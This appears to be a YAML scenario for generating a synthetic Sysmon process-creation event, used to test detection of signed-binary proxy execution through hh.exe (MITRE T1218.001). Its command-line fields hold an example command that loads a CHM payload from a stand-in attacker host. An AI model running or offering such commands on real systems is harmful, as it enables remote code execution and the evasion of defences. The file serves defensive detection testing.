type: scenario
description: |
  Defense evasion via T1218.001: hh.exe (Microsoft HTML Help) loads a Compiled HTML
  Help file (CHM) from a remote HTTP/HTTPS URL. The URL appears directly in the
  process command line, allowing script engines (JScript, VBScript) embedded in the
  CHM to execute under the hh.exe process context.
tags: [eid1]
mitre:
  tactics: [defense-evasion]
  techniques: [T1218.001]

state:
  domain_short:           CORP
  domain_tld:             local
  domain_short_lower:     fn.lower(ref.domain_short)
  domain_fqdn:            "${ref.domain_short_lower}.${ref.domain_tld}"
  computer:               gen.hostname(class=windows-workstation, domain=ref.domain_fqdn)
  sysmon_pid:             gen.int(min=1000, max=4000)
  sysmon_tid:             gen.int(min=1000, max=9999)
  event_record_id:        gen.int(min=5000, max=99999)
  process_guid_raw:       gen.uuid()
  process_guid:           "{${ref.process_guid_raw}}"
  process_id:             gen.int(min=1000, max=9999)
  parent_process_guid_raw: gen.uuid()
  parent_process_guid:    "{${ref.parent_process_guid_raw}}"
  parent_process_id:      gen.int(min=1000, max=9999)
  logon_guid_raw:         gen.uuid()
  logon_guid:             "{${ref.logon_guid_raw}}"
  user:                   gen.username()
  domain_user:            "${ref.domain_short}\\${ref.user}"
  remote_url:             "https://attacker.example.com/payload.chm"
  command_line:           "hh.exe ${ref.remote_url}"
  current_directory:      "C:\\Users\\${ref.user}\\AppData\\Local\\Temp\\"
  logon_id:               "0x148e3a"
  terminal_session_id:    2
  integrity_level:        High
  parent_image:           "C:\\Windows\\System32\\cmd.exe"
  parent_command_line:    "\"C:\\Windows\\system32\\cmd.exe\" /c \"${ref.command_line}\""

steps:
  - emit:
      event_type: windows.wineventlog@v1
      fields:
        System:
          Provider:
            "@Name": Microsoft-Windows-Sysmon
            "@Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          EventID: 1
          Version: 5
          Level: 4
          Task: 1
          Opcode: 0
          Keywords: "0x8000000000000000"
          TimeCreated:
            "@SystemTime": gen.timestamp(format=wineventlog)
          EventRecordID: ref.event_record_id
          Correlation: {}
          Execution:
            "@ProcessID": ref.sysmon_pid
            "@ThreadID": ref.sysmon_tid
          Channel: Microsoft-Windows-Sysmon/Operational
          Computer: ref.computer
          Security:
            "@UserID": S-1-5-18
        EventData:
          Data:
            - "@Name": RuleName
              "#text": "-"
            - "@Name": UtcTime
              "#text": gen.timestamp(format=sysmon)
            - "@Name": ProcessGuid
              "#text": ref.process_guid
            - "@Name": ProcessId
              "#text": ref.process_id
            - "@Name": Image
              "#text": "C:\\Windows\\hh.exe"
            - "@Name": FileVersion
              "#text": "10.0.14393.0 (rs1_release.160715-1616)"
            - "@Name": Description
              "#text": "Microsoft HTML Help Executable"
            - "@Name": Product
              "#text": "HTML Help"
            - "@Name": Company
              "#text": "Microsoft Corporation"
            - "@Name": OriginalFileName
              "#text": HH.exe
            - "@Name": CommandLine
              "#text": ref.command_line
            - "@Name": CurrentDirectory
              "#text": ref.current_directory
            - "@Name": User
              "#text": ref.domain_user
            - "@Name": LogonGuid
              "#text": ref.logon_guid
            - "@Name": LogonId
              "#text": ref.logon_id
            - "@Name": TerminalSessionId
              "#text": ref.terminal_session_id
            - "@Name": IntegrityLevel
              "#text": ref.integrity_level
            - "@Name": Hashes
              "#text": "MD5=52AFE6DE5E463B7A08C184B1EB49DD6A,SHA256=9823D79E936B57C94BFB84383CC708BFC15D1D16E67F6CB119B60F28B01BFA63,IMPHASH=4EDF49AE6BCC4F8FED829FAFD5D4D269"
            - "@Name": ParentProcessGuid
              "#text": ref.parent_process_guid
            - "@Name": ParentProcessId
              "#text": ref.parent_process_id
            - "@Name": ParentImage
              "#text": ref.parent_image
            - "@Name": ParentCommandLine
              "#text": ref.parent_command_line
